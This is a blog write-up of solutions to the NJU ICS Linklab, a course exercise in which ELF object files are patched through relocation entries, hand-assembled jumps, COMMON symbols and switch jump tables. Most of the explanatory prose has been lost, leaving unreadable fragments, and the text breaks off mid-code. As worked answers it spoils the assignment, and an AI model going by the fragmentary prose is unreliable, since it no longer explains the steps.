        <content type="html"><![CDATA[<h1 id="NJU-ICS4-Linklab"><a href="#NJU-ICS4-Linklab" class="headerlink" title="NJU ICS4 Linklab"></a>NJU ICS4 Linklab</h1><p>moocpwn(bu shi)hacklablab:)</p><p><a href="https://pan.baidu.com/s/1_tPhDGhKaF4HZ94oayqnMw">https://pan.baidu.com/s/1_tPhDGhKaF4HZ94oayqnMw</a><br>fbex</p><p>x86-32</p><p> 1 ELF <br> 2 ELF <br> 3<br> 4switch <br> 5<br> 6Position-Independent CodePIC</p><h2 id="phase1"><a href="#phase1" class="headerlink" title="phase1"></a>phase1</h2><figure class="highlight c"><table><tr><td class="code"><pre><span class="line">grxer@ubuntu22-wsl ~/s/N/NJU-ICS-linklab (main) [<span class="number">1</span>]&gt; gcc -m32 -no-pie -o linkbomb main.o phase1.o</span><br><span class="line">grxer@ubuntu22-wsl ~/s/N/NJU-ICS-linklab (main)&gt; ./linkbomb</span><br><span class="line">ddURHzFnm2mcxbehqVcVufpd68LdEePs        lYPCnZfPLLbMLzV3iM1A97QVLg7j8zcmDlD0clCtKV0kgLRshaBQ3kCaGG YMbr9ELE31xt2fau4zX7bEMCVf   qXOdnQ igVJcDsac1d9N7kSla5VLXAKDtjxAoNjW2tonwDzyASqLn5JKSf32EqapXP83B03NmDqUx</span><br></pre></td></tr></table></figure><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"> grxer@ubuntu22-wsl ~/s/N/NJU-ICS-linklab (main)&gt; objdump -d phase1.o</span><br><span class="line"></span><br><span class="line">phase1.o:     file format elf32-i386</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Disassembly of section .text:</span><br><span class="line"></span><br><span class="line"><span class="number">00000000</span> &lt;do_phase&gt;:</span><br><span class="line">   <span class="number">0</span>:   <span class="number">55</span>                      push   %ebp</span><br><span class="line">   <span class="number">1</span>:   <span class="number">89</span> e5                   mov    %esp,%ebp</span><br><span class="line">   <span class="number">3</span>:   <span class="number">83</span> ec <span class="number">08</span>                sub    $<span class="number">0x8</span>,%esp</span><br><span class="line">   <span class="number">6</span>:   b8 <span class="number">9</span>a <span class="number">00</span> <span class="number">00</span> <span class="number">00</span>          mov    $<span class="number">0x9a</span>,%eax</span><br><span class="line">   b:   <span class="number">83</span> ec <span class="number">0</span>c                sub    $<span class="number">0xc</span>,%esp</span><br><span class="line">   e:   <span class="number">50</span>                      push   %eax</span><br><span class="line">   f:   e8 fc ff ff ff          call   <span class="number">10</span> &lt;do_phase+<span class="number">0x10</span>&gt;</span><br><span class="line">  <span class="number">14</span>:   <span class="number">83</span> c4 <span class="number">10</span>                add    $<span class="number">0x10</span>,%esp</span><br><span class="line">  <span class="number">17</span>:   <span class="number">90</span>                      nop</span><br><span class="line">  <span class="number">18</span>:   c9                      leave</span><br><span class="line">  <span class="number">19</span>:   c3                      ret</span><br><span class="line">      </span><br><span class="line"> grxer@ubuntu22-wsl ~/s/N/NJU-ICS-linklab (main)&gt; readelf -r phase1.o</span><br><span class="line"></span><br><span class="line">Relocation section <span class="string">&#x27;.rel.text&#x27;</span> at offset <span class="number">0x354</span> contains <span class="number">2</span> entries:</span><br><span class="line"> Offset     Info    Type            Sym.Value  Sym. Name</span><br><span class="line"><span class="number">00000007</span>  <span class="number">00000301</span> R_386_32          <span class="number">00000000</span>   .data</span><br><span class="line"><span class="number">00000010</span>  <span class="number">00000e02</span> R_386_PC32        <span class="number">00000000</span>   <span class="built_in">puts</span></span><br></pre></td></tr></table></figure><p>.rel.texttextoffset 10puts0x9aputs.data</p><p><img src="/2023/05/08/ics4-linklab/image-20230506171613189.png" alt="image-20230506171613189"></p><p></p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line">grxer@ubuntu22-wsl ~/s/N/NJU-ICS-linklab (main)&gt; gcc -m32 -no-pie -o linkbomb main.o phase1.o</span><br><span class="line">grxer@ubuntu22-wsl ~/s/N/NJU-ICS-linklab (main)&gt; ./linkbomb</span><br><span class="line">grxer</span><br></pre></td></tr></table></figure><h2 id="phase2"><a href="#phase2" class="headerlink" title="phase2"></a>phase2</h2><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="number">00000061</span> &lt;kfSvKnbh&gt;:</span><br><span class="line">  <span class="number">61</span>:   <span class="number">55</span>                      push   %ebp</span><br><span class="line">  <span class="number">62</span>:   <span class="number">89</span> e5                   mov    %esp,%ebp</span><br><span class="line">  <span class="number">64</span>:   <span class="number">83</span> ec <span class="number">08</span>                sub    $<span class="number">0x8</span>,%esp</span><br><span class="line">  <span class="number">67</span>:   <span class="number">83</span> ec <span class="number">08</span>                sub    $<span class="number">0x8</span>,%esp</span><br><span class="line">  <span class="number">6</span>a:   <span class="number">68</span> <span class="number">02</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span>          push   $<span class="number">0x2</span></span><br><span class="line">  <span class="number">6f</span>:   ff <span class="number">75</span> <span class="number">08</span>                push   <span class="number">0x8</span>(%ebp)</span><br><span class="line">  <span class="number">72</span>:   e8 fc ff ff ff          call   <span class="number">73</span> &lt;kfSvKnbh+<span class="number">0x12</span>&gt;</span><br><span class="line">  <span class="number">77</span>:   <span class="number">83</span> c4 <span class="number">10</span>                add    $<span class="number">0x10</span>,%esp</span><br><span class="line">  <span class="number">7</span>a:   <span class="number">85</span> c0                   test   %eax,%eax</span><br><span class="line">  <span class="number">7</span>c:   <span class="number">75</span> <span class="number">10</span>                   jne    <span class="number">8</span>e &lt;kfSvKnbh+<span class="number">0x2d</span>&gt;</span><br><span class="line">  <span class="number">7</span>e:   <span class="number">83</span> ec <span class="number">0</span>c                sub    $<span class="number">0xc</span>,%esp</span><br><span class="line">  <span class="number">81</span>:   ff <span class="number">75</span> <span class="number">0</span>c                push   <span class="number">0xc</span>(%ebp)</span><br><span class="line">  <span class="number">84</span>:   e8 fc ff ff ff          call   <span class="number">85</span> &lt;kfSvKnbh+<span class="number">0x24</span>&gt;</span><br><span class="line">  <span class="number">89</span>:   <span class="number">83</span> c4 <span class="number">10</span>                add    $<span class="number">0x10</span>,%esp</span><br><span class="line">  <span class="number">8</span>c:   eb <span class="number">01</span>                   jmp    <span class="number">8f</span> &lt;kfSvKnbh+<span class="number">0x2e</span>&gt;</span><br><span class="line">  <span class="number">8</span>e:   <span class="number">90</span>                      nop</span><br><span class="line">  <span class="number">8f</span>:   c9                      leave</span><br><span class="line">  <span class="number">90</span>:   c3                      ret</span><br><span class="line">  <span class="number">00000091</span> &lt;do_phase&gt;:</span><br><span class="line">  <span class="number">91</span>:   <span class="number">55</span>                      push   %ebp</span><br><span class="line">  <span class="number">92</span>:   <span class="number">89</span> e5                   mov    %esp,%ebp</span><br><span class="line">  <span class="number">94</span>:   <span class="number">90</span>                      nop</span><br><span class="line">  <span class="number">95</span>:   <span class="number">90</span>                      nop</span><br><span class="line">  <span class="number">96</span>:   <span class="number">90</span>                      nop</span><br><span class="line">  <span class="number">97</span>:   <span class="number">90</span>                      nop</span><br><span class="line">  <span class="number">98</span>:   <span class="number">90</span>                      nop</span><br><span class="line">  ...nop</span><br><span class="line">  d5:   <span class="number">5</span>d                      pop    %ebp</span><br><span class="line">  d6:   c3                      ret</span><br><span class="line"> grxer@ubuntu22-wsl ~/s/N/NJU-ICS-linklab (main)&gt; readelf -r phase1.ogrxer@ubuntu22-wsl ~/s/N/NJU-ICS-linklab (main)&gt; readelf -r phase2.o</span><br><span class="line"></span><br><span class="line">Relocation section <span class="string">&#x27;.rel.text&#x27;</span> at offset <span class="number">0x308</span> contains <span class="number">4</span> entries:</span><br><span class="line"> Offset     Info    Type            Sym.Value  Sym. Name</span><br><span class="line"><span class="number">00000035</span>  <span class="number">00000</span>c02 R_386_PC32        <span class="number">00000000</span>   <span class="built_in">strlen</span></span><br><span class="line"><span class="number">0000006b</span>  <span class="number">00000501</span> R_386_32          <span class="number">00000000</span>   .rodata</span><br><span class="line"><span class="number">00000073</span>  <span class="number">00000</span>d02 R_386_PC32        <span class="number">00000000</span>   <span class="built_in">strcmp</span></span><br><span class="line"><span class="number">00000085</span>  <span class="number">00000e02</span> R_386_PC32        <span class="number">00000000</span>   <span class="built_in">puts</span></span><br><span class="line"></span><br><span class="line">Relocation section <span class="string">&#x27;.rel.text&#x27;</span> at offset <span class="number">0x354</span> contains <span class="number">2</span> entries:</span><br><span class="line"> Offset     Info    Type            Sym.Value  Sym. Name</span><br><span class="line"><span class="number">00000007</span>  <span class="number">00000301</span> R_386_32          <span class="number">00000000</span>   .data</span><br><span class="line"><span class="number">00000010</span>  <span class="number">00000e02</span> R_386_PC32        <span class="number">00000000</span>   <span class="built_in">puts</span></span><br></pre></td></tr></table></figure><p>do_phasenopputs00000085do_phasee9 jmpputs</p><p></p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line">sub esp,<span class="number">0x30</span></span><br><span class="line">mov dword ptr [ebp<span class="number">-0x10</span>],<span class="number">72</span>h</span><br><span class="line">mov dword ptr [ebp<span class="number">-0x14</span>],<span class="number">65787267</span>h</span><br><span class="line">lea eax, [ebp<span class="number">-0x18</span>]</span><br><span class="line">push eax</span><br></pre></td></tr></table></figure><p><img src="/2023/05/08/ics4-linklab/image-20230506223216046.png" alt="image-20230506223216046"></p><p>ida patchjmp84</p><p>**intel 64-ia-32-architectures-software-developer-instruction-set-reference-manual-2 **</p><p><img src="/2023/05/08/ics4-linklab/image-20230506221626593.png" alt="image-20230506221626593"></p><blockquote><p> e8 calle8 callpushcall puts</p><p><img src="/2023/05/08/ics4-linklab/image-20230506213529559.png" alt="image-20230506213529559"></p></blockquote><p>calla95()ae84-aeFFFF FFD6</p><p>e9 d6 ff ff ff010</p><p><img src="/2023/05/08/ics4-linklab/image-20230506223052595.png" alt="image-20230506223052595"></p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="number">00000091</span> &lt;do_phase&gt;:</span><br><span class="line">  <span class="number">91</span>:   <span class="number">55</span>                      push   %ebp</span><br><span class="line">  <span class="number">92</span>:   <span class="number">89</span> e5                   mov    %esp,%ebp</span><br><span class="line">  <span class="number">94</span>:   <span class="number">83</span> ec <span class="number">30</span>                sub    $<span class="number">0x30</span>,%esp</span><br><span class="line">  <span class="number">97</span>:   c7 <span class="number">45</span> f0 <span class="number">72</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span>    movl   $<span class="number">0x72</span>,<span class="number">-0x10</span>(%ebp)</span><br><span class="line">  <span class="number">9</span>e:   c7 <span class="number">45</span> ec <span class="number">67</span> <span class="number">72</span> <span class="number">78</span> <span class="number">65</span>    movl   $<span class="number">0x65787267</span>,<span class="number">-0x14</span>(%ebp)</span><br><span class="line">  a5:   <span class="number">8</span>d <span class="number">45</span> ec                lea    <span class="number">-0x14</span>(%ebp),%eax</span><br><span class="line">  a8:   <span class="number">50</span>                      push   %eax</span><br><span class="line">  a9:   e9 d6 ff ff ff          jmp    <span class="number">84</span> &lt;kfSvKnbh+<span class="number">0x23</span>&gt;</span><br></pre></td></tr></table></figure><p>kfSvKnbh leave retmaindo_phase</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line">grxer@ubuntu22-wsl ~/s/N/NJU-ICS-linklab (main)&gt; gcc -m32 -no-pie -o linkbomb main.o phase2.o</span><br><span class="line">grxer@ubuntu22-wsl ~/s/N/NJU-ICS-linklab (main)&gt; ./linkbomb</span><br><span class="line">grxer</span><br></pre></td></tr></table></figure><h2 id="phase3"><a href="#phase3" class="headerlink" title="phase3"></a>phase3</h2><figure class="highlight c"><table><tr><td class="code"><pre><span class="line">gcc -m32 -no-pie -o linkbomb main.o phase3.o</span><br><span class="line">grxer@ubuntu22-wsl ~/s/N/NJU-ICS-linklab (main)&gt; ./linkbomb</span><br></pre></td></tr></table></figure><p></p><p></p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">080491c6 &lt;do_phase&gt;:</span><br><span class="line"> 80491c6:       55                      push   %ebp</span><br><span class="line"> 80491c7:       89 e5                   mov    %esp,%ebp</span><br><span class="line"> 80491c9:       83 ec 18                sub    $0x18,%esp</span><br><span class="line"> 80491cc:       c7 45 ea 79 7a 67 69    movl   $0x69677a79,-0x16(%ebp); 80491daebp-0x16cookie</span><br><span class="line"> 80491d3:       c7 45 ee 75 68 6e 62    movl   $0x626e6875,-0x12(%ebp)</span><br><span class="line"> 80491da:       66 c7 45 f2 65 00       movw   $0x65,-0xe(%ebp);cookie</span><br><span class="line"> 80491e0:       c7 45 f4 00 00 00 00    movl   $0x0,-0xc(%ebp) ;ebp-c</span><br><span class="line"> 80491e7:       eb 28                   jmp    8049211 &lt;do_phase+0x4b&gt;</span><br><span class="line"> </span><br><span class="line"> 80491e9:       8d 55 ea                lea    -0x16(%ebp),%edx</span><br><span class="line"> 80491ec:       8b 45 f4                mov    -0xc(%ebp),%eax</span><br><span class="line"> 80491ef:       01 d0                   add    %edx,%eax</span><br><span class="line"> 80491f1:       0f b6 00                movzbl (%eax),%eax;cookie[]</span><br><span class="line"> 80491f4:       0f b6 c0                movzbl %al,%eax</span><br><span class="line"> 80491f7:       0f b6 80 60 c0 04 08    movzbl 0x804c060(%eax),%eax;0x804c060NQqPQyqUtheaxNQqPQyqUth+cookie[]</span><br><span class="line"> 80491fe:       0f be c0                movsbl %al,%eax</span><br><span class="line"> 8049201:       83 ec 0c                sub    $0xc,%esp</span><br><span class="line"> 8049204:       50                      push   %eax</span><br><span class="line"> 8049205:       e8 56 fe ff ff          call   8049060 &lt;putchar@plt&gt;</span><br><span class="line"> 804920a:       83 c4 10                add    $0x10,%esp</span><br><span class="line"> 804920d:       83 45 f4 01             addl   $0x1,-0xc(%ebp);1</span><br><span class="line"> </span><br><span class="line"> 8049211:       8b 45 f4                mov    -0xc(%ebp),%eax</span><br><span class="line"> 8049214:       83 f8 08                cmp    $0x8,%eax;8</span><br><span class="line"> 8049217:       76 d0                   jbe    80491e9 &lt;do_phase+0x23&gt;</span><br><span class="line"> 8049219:       83 ec 0c                sub    $0xc,%esp</span><br><span class="line"> 804921c:       6a 0a                   push   $0xa ;</span><br><span class="line"> 804921e:       e8 3d fe ff ff          call   8049060 &lt;putchar@plt&gt;</span><br><span class="line"> 8049223:       83 c4 10                add    $0x10,%esp</span><br><span class="line"> 8049226:       90                      nop</span><br><span class="line"> 8049227:       c9                      leave</span><br><span class="line"> 8049228:       c3                      ret</span><br></pre></td></tr></table></figure><p></p><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">grxer@ubuntu22-wsl ~/s/N/NJU-ICS-linklab (main)&gt; readelf -s phase3.o</span><br><span class="line"></span><br><span class="line">Symbol table &#x27;.symtab&#x27; contains 14 entries:</span><br><span class="line">   Num:    Value  Size Type    Bind   Vis      Ndx Name</span><br><span class="line">     0: 00000000     0 NOTYPE  LOCAL  DEFAULT  UND</span><br><span class="line">     1: 00000000     0 FILE    LOCAL  DEFAULT  ABS phase3.c</span><br><span class="line">     2: 00000000     0 SECTION LOCAL  DEFAULT    1 .text</span><br><span class="line">     3: 00000000     0 SECTION LOCAL  DEFAULT    3 .data</span><br><span class="line">     4: 00000000     0 SECTION LOCAL  DEFAULT    5 .bss</span><br><span class="line">     5: 00000000     0 SECTION LOCAL  DEFAULT    6 .rodata</span><br><span class="line">     6: 00000000     0 SECTION LOCAL  DEFAULT    8 .note.GNU-stack</span><br><span class="line">     7: 00000000     0 SECTION LOCAL  DEFAULT    9 .eh_frame</span><br><span class="line">     8: 00000000     0 SECTION LOCAL  DEFAULT    7 .comment</span><br><span class="line">     9: 00000000     4 OBJECT  GLOBAL DEFAULT    3 phase_id</span><br><span class="line">    10: 00000020   256 OBJECT  GLOBAL DEFAULT  COM NQqPQyqUth</span><br><span class="line">    11: 00000000    99 FUNC    GLOBAL DEFAULT    1 do_phase</span><br><span class="line">    12: 00000000     0 NOTYPE  GLOBAL DEFAULT  UND putchar</span><br><span class="line">    13: 00000004     4 OBJECT  GLOBAL DEFAULT    3 phase</span><br></pre></td></tr></table></figure><p>c</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">char</span> NQqPQyqUth[<span class="number">256</span>];</span><br><span class="line">do_phase&#123;</span><br><span class="line">    <span class="type">char</span> cookie[<span class="number">10</span>]=&#123; <span class="number">79</span> <span class="number">7</span>a <span class="number">67</span> <span class="number">69</span>  <span class="number">75</span> <span class="number">68</span> <span class="number">6</span>e <span class="number">62</span>  <span class="number">65</span> <span class="number">00</span>&#125;;<span class="comment">//</span></span><br><span class="line">    <span class="keyword">for</span>(<span class="type">int</span> i = <span class="number">0</span>; i &lt;= <span class="number">9</span> ; i++)</span><br><span class="line">        <span class="built_in">putchar</span>(NQqPQyqUth[cookie[i]]);</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">putchar</span>(<span class="string">&#x27;\n&#x27;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>NQqPQyqUthCOMMon0 <a href="https://grxer.github.io/2023/04/28/static-link/">https://grxer.github.io/2023/04/28/static-link/</a> </p><p>NQqPQyqUthcookie</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">//phase3_patch.c</span></span><br><span class="line"><span class="type">char</span> NQqPQyqUth[<span class="number">256</span>]=<span class="string">&quot;0000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000x0e00000000000r000gr&quot;</span>;</span><br></pre></td></tr></table></figure><figure class="highlight c"><table><tr><td class="code"><pre><span class="line">grxer@ubuntu22-wsl ~/s/N/NJU-ICS-linklab (main)&gt; gcc -m32 -no-pie  -c phase3_patch.c</span><br><span class="line">grxer@ubuntu22-wsl ~/s/N/NJU-ICS-linklab (main)&gt; gcc -m32 -no-pie -o linkbomb main.o phase3.o phase3_patch.o</span><br><span class="line">grxer@ubuntu22-wsl ~/s/N/NJU-ICS-linklab (main)&gt; ./linkbomb</span><br><span class="line">grxer0000</span><br></pre></td></tr></table></figure><h2 id="phase4"><a href="#phase4" class="headerlink" title="phase4"></a>phase4</h2><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">grxer@ubuntu22-wsl ~/s/N/NJU-ICS-linklab (main)&gt; gcc -m32 -no-pie -o linkbomb main.o phase4.o</span><br><span class="line">grxer@ubuntu22-wsl ~/s/N/NJU-ICS-linklab (main)&gt; ./linkbomb</span><br><span class="line">B9[wL:Nec</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">00000029 &lt;do_phase&gt;:</span><br><span class="line">  29:   55                      push   %ebp</span><br><span class="line">  2a:   89 e5                   mov    %esp,%ebp</span><br><span class="line">  2c:   83 ec 28                sub    $0x28,%esp</span><br><span class="line">  2f:   c7 45 e6 53 4e 58 47    movl   $0x47584e53,-0x1a(%ebp)</span><br><span class="line">  36:   c7 45 ea 4a 54 43 46    movl   $0x4643544a,-0x16(%ebp)</span><br><span class="line">  3d:   66 c7 45 ee 50 00       movw   $0x50,-0x12(%ebp);ebp-0x1acookie</span><br><span class="line">  43:   c7 45 f0 00 00 00 00    movl   $0x0,-0x10(%ebp);ebp-0x10</span><br><span class="line">  4a:   e9 e0 00 00 00          jmp    12f &lt;do_phase+0x106&gt;</span><br><span class="line">  </span><br><span class="line">  4f:   8d 55 e6                lea    -0x1a(%ebp),%edx</span><br><span class="line">  52:   8b 45 f0                mov    -0x10(%ebp),%eax</span><br><span class="line">  55:   01 d0                   add    %edx,%eax</span><br><span class="line">  57:   0f b6 00                movzbl (%eax),%eax;eax=cookie[]</span><br><span class="line">  5a:   88 45 f7                mov    %al,-0x9(%ebp)</span><br><span class="line">  5d:   0f be 45 f7             movsbl -0x9(%ebp),%eax</span><br><span class="line">  61:   83 e8 41                sub    $0x41,%eax;cookie[]-0x41 case</span><br><span class="line">  64:   83 f8 19                cmp    $0x19,%eax;cookie[]-0x4119</span><br><span class="line">  67:   0f 87 b0 00 00 00       ja     11d &lt;do_phase+0xf4&gt;;switchdefault</span><br><span class="line">  6d:   8b 04 85 04 00 00 00    mov    0x4(,%eax,4),%eax;.rodataeax=*(eax*4+.rodata+4)</span><br><span class="line">  74:   ff e0                   jmp    *%eax;switchswitchcasejmp *eax,</span><br><span class="line">  76:   c6 45 f7 38             movb   $0x38,-0x9(%ebp)</span><br><span class="line">  7a:   e9 9e 00 00 00          jmp    11d &lt;do_phase+0xf4&gt;</span><br><span class="line">  7f:   c6 45 f7 65             movb   $0x65,-0x9(%ebp)</span><br><span class="line">  83:   e9 95 00 00 00          jmp    11d &lt;do_phase+0xf4&gt;</span><br><span class="line">  88:   c6 45 f7 35             movb   $0x35,-0x9(%ebp)</span><br><span class="line">  8c:   e9 8c 00 00 00          jmp    11d &lt;do_phase+0xf4&gt;</span><br><span class="line">  91:   c6 45 f7 39             movb   $0x39,-0x9(%ebp)</span><br><span class="line">  95:   e9 83 00 00 00          jmp    11d &lt;do_phase+0xf4&gt;</span><br><span class="line">  9a:   c6 45 f7 6d             movb   $0x6d,-0x9(%ebp)</span><br><span class="line">  9e:   eb 7d                   jmp    11d &lt;do_phase+0xf4&gt;</span><br><span class="line">  a0:   c6 45 f7 6d             movb   $0x6d,-0x9(%ebp)</span><br><span class="line">  a4:   eb 77                   jmp    11d &lt;do_phase+0xf4&gt;</span><br><span class="line">  a6:   c6 45 f7 4c             movb   $0x4c,-0x9(%ebp)</span><br><span class="line">  aa:   eb 71                   jmp    11d &lt;do_phase+0xf4&gt;</span><br><span class="line">  ac:   c6 45 f7 73             movb   $0x73,-0x9(%ebp)</span><br><span class="line">  b0:   eb 6b                   jmp    11d &lt;do_phase+0xf4&gt;</span><br><span class="line">  b2:   c6 45 f7 45             movb   $0x45,-0x9(%ebp)</span><br><span class="line">  b6:   eb 65                   jmp    11d &lt;do_phase+0xf4&gt;</span><br><span class="line">  b8:   c6 45 f7 37             movb   $0x37,-0x9(%ebp)</span><br><span class="line">  bc:   eb 5f                   jmp    11d &lt;do_phase+0xf4&gt;</span><br><span class="line">  be:   c6 45 f7 42             movb   $0x42,-0x9(%ebp)</span><br><span class="line">  c2:   eb 59                   jmp    11d &lt;do_phase+0xf4&gt;</span><br><span class="line">  c4:   c6 45 f7 77             movb   $0x77,-0x9(%ebp)</span><br><span class="line">  c8:   eb 53                   jmp    11d &lt;do_phase+0xf4&gt;</span><br><span class="line">  ca:   c6 45 f7 36             movb   $0x36,-0x9(%ebp)</span><br><span class="line">  ce:   eb 4d                   jmp    11d &lt;do_phase+0xf4&gt;</span><br><span class="line">  d0:   c6 45 f7 3a             movb   $0x3a,-0x9(%ebp)</span><br><span class="line">  d4:   eb 47                   jmp    11d &lt;do_phase+0xf4&gt;</span><br><span class="line">  d6:   c6 45 f7 5b             movb   $0x5b,-0x9(%ebp)</span><br><span class="line">  da:   eb 41                   jmp    11d &lt;do_phase+0xf4&gt;</span><br><span class="line">  dc:   c6 45 f7 63             movb   $0x63,-0x9(%ebp)</span><br><span class="line">  e0:   eb 3b                   jmp    11d &lt;do_phase+0xf4&gt;</span><br><span class="line">  e2:   c6 45 f7 5b             movb   $0x5b,-0x9(%ebp)</span><br><span class="line">  e6:   eb 35                   jmp    11d &lt;do_phase+0xf4&gt;</span><br><span class="line">  e8:   c6 45 f7 33             movb   $0x33,-0x9(%ebp)</span><br><span class="line">  ec:   eb 2f                   jmp    11d &lt;do_phase+0xf4&gt;</span><br><span class="line">  ee:   c6 45 f7 55             movb   $0x55,-0x9(%ebp)</span><br><span class="line">  f2:   eb 29                   jmp    11d &lt;do_phase+0xf4&gt;</span><br><span class="line">  f4:   c6 45 f7 77             movb   $0x77,-0x9(%ebp)</span><br><span class="line">  f8:   eb 23                   jmp    11d &lt;do_phase+0xf4&gt;</span><br><span class="line">  fa:   c6 45 f7 32             movb   $0x32,-0x9(%ebp)</span><br><span class="line">  fe:   eb 1d                   jmp    11d &lt;do_phase+0xf4&gt;</span><br><span class="line"> 100:   c6 45 f7 4e             movb   $0x4e,-0x9(%ebp)</span><br><span class="line"> 104:   eb 17                   jmp    11d &lt;do_phase+0xf4&gt;</span><br><span class="line"> 106:   c6 45 f7 30             movb   $0x30,-0x9(%ebp)</span><br><span class="line"> 10a:   eb 11                   jmp    11d &lt;do_phase+0xf4&gt;</span><br><span class="line"> 10c:   c6 45 f7 31             movb   $0x31,-0x9(%ebp)</span><br><span class="line"> 110:   eb 0b                   jmp    11d &lt;do_phase+0xf4&gt;</span><br><span class="line"> 112:   c6 45 f7 34             movb   $0x34,-0x9(%ebp)</span><br><span class="line"> 116:   eb 05                   jmp    11d &lt;do_phase+0xf4&gt;</span><br><span class="line"> 118:   c6 45 f7 67             movb   $0x67,-0x9(%ebp)</span><br><span class="line"> 11c:   90                      nop</span><br><span class="line"> </span><br><span class="line"> 11d:   8d 55 dc                lea    -0x24(%ebp),%edx</span><br><span class="line"> 120:   8b 45 f0                mov    -0x10(%ebp),%eax</span><br><span class="line"> 123:   01 c2                   add    %eax,%edx;edx=ebp-0x24+</span><br><span class="line"> 125:   0f b6 45 f7             movzbl -0x9(%ebp),%eax</span><br><span class="line"> 129:   88 02                   mov    %al,(%edx);*(ebp-0x24+)=*(ebp-9</span><br><span class="line"> 12b:   83 45 f0 01             addl   $0x1,-0x10(%ebp);+1</span><br><span class="line"> </span><br><span class="line"> 12f:   8b 45 f0                mov    -0x10(%ebp),%eax</span><br><span class="line"> 132:   83 f8 08                cmp    $0x8,%eax</span><br><span class="line"> 135:   0f 86 14 ff ff ff       jbe    4f &lt;do_phase+0x26&gt;;&gt;9</span><br><span class="line"> </span><br><span class="line"> 13b:   8d 55 dc                lea    -0x24(%ebp),%edx</span><br><span class="line"> 13e:   8b 45 f0                mov    -0x10(%ebp),%eax</span><br><span class="line"> 141:   01 d0                   add    %edx,%eax</span><br><span class="line"> 143:   c6 00 00                movb   $0x0,(%eax)</span><br><span class="line"> 146:   83 ec 0c                sub    $0xc,%esp</span><br><span class="line"> 149:   8d 45 dc                lea    -0x24(%ebp),%eax </span><br><span class="line"> 14c:   50                      push   %eax;ebp-0x24puts</span><br><span class="line"> 14d:   e8 fc ff ff ff          call   14e &lt;do_phase+0x125&gt;;puts</span><br><span class="line"> 152:   83 c4 10                add    $0x10,%esp</span><br><span class="line"> 155:   90                      nop</span><br><span class="line"> 156:   c9                      leave</span><br><span class="line"> 157:   c3                      ret</span><br><span class="line">grxer@ubuntu22-wsl ~/s/N/NJU-ICS-linklab (main)&gt; readelf -r phase4.o</span><br><span class="line"></span><br><span class="line">Relocation section &#x27;.rel.text&#x27; at offset 0x3e0 contains 2 entries:</span><br><span class="line"> Offset     Info    Type            Sym.Value  Sym. Name</span><br><span class="line">00000070  00000701 R_386_32          00000000   .rodata</span><br><span class="line">0000014e  00000d02 R_386_PC32        00000000   puts</span><br><span class="line"></span><br><span class="line">Relocation section &#x27;.rel.data&#x27; at offset 0x3f0 contains 2 entries:</span><br><span class="line"> Offset     Info    Type            Sym.Value  Sym. Name</span><br><span class="line">00000030  00000701 R_386_32          00000000   .rodata</span><br><span class="line">00000034  00000c01 R_386_32          00000029   do_phase</span><br><span class="line"></span><br><span class="line">Relocation section &#x27;.rel.rodata&#x27; at offset 0x400 contains 26 entries:</span><br><span class="line"> Offset     Info    Type            Sym.Value  Sym. Name</span><br><span class="line">00000004  00000201 R_386_32          00000000   .text</span><br><span class="line">00000008  00000201 R_386_32          00000000   .text</span><br><span class="line">0000000c  00000201 R_386_32          00000000   .text</span><br><span class="line">00000010  00000201 R_386_32          00000000   .text</span><br><span class="line">00000014  00000201 R_386_32          00000000   .text</span><br><span class="line">00000018  00000201 R_386_32          00000000   .text</span><br><span class="line">0000001c  00000201 R_386_32          00000000   .text</span><br><span class="line">00000020  00000201 R_386_32          00000000   .text</span><br><span class="line">00000024  00000201 R_386_32          00000000   .text</span><br><span class="line">00000028  00000201 R_386_32          00000000   .text</span><br><span class="line">0000002c  00000201 R_386_32          00000000   .text</span><br><span class="line">00000030  00000201 R_386_32          00000000   .text</span><br><span class="line">00000034  00000201 R_386_32          00000000   .text</span><br><span class="line">00000038  00000201 R_386_32          00000000   .text</span><br><span class="line">0000003c  00000201 R_386_32          00000000   .text</span><br><span class="line">00000040  00000201 R_386_32          00000000   .text</span><br><span class="line">00000044  00000201 R_386_32          00000000   .text</span><br><span class="line">00000048  00000201 R_386_32          00000000   .text</span><br><span class="line">0000004c  00000201 R_386_32          00000000   .text</span><br><span class="line">00000050  00000201 R_386_32          00000000   .text</span><br><span class="line">00000054  00000201 R_386_32          00000000   .text</span><br><span class="line">00000058  00000201 R_386_32          00000000   .text</span><br><span class="line">0000005c  00000201 R_386_32          00000000   .text</span><br><span class="line">00000060  00000201 R_386_32          00000000   .text</span><br><span class="line">00000064  00000201 R_386_32          00000000   .text</span><br><span class="line">00000068  00000201 R_386_32          00000000   .text</span><br></pre></td></tr></table></figure><p>c</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line">do_phase&#123;</span><br><span class="line">    <span class="type">char</span> cookie[<span class="number">10</span>]=&#123; <span class="number">53</span> <span class="number">4</span>e <span class="number">58</span> <span class="number">47</span>  <span class="number">4</span>a <span class="number">54</span> <span class="number">43</span> <span class="number">46</span>  <span class="number">50</span> <span class="number">00</span>&#125;;</span><br><span class="line">    <span class="type">char</span> answer[<span class="number">10</span>];</span><br><span class="line">    <span class="type">char</span> tmp;</span><br><span class="line">    <span class="keyword">for</span>(<span class="type">int</span> i=<span class="number">0</span>;i&lt;=<span class="number">8</span>;i++)&#123;</span><br><span class="line">        <span class="keyword">switch</span> tmp=cookie[i]<span class="number">-0x41</span>&#123;</span><br><span class="line">            <span class="keyword">case</span> <span class="number">0</span>:</span><br><span class="line">                tmp=xxx;</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            .....</span><br><span class="line">            <span class="keyword">case</span> 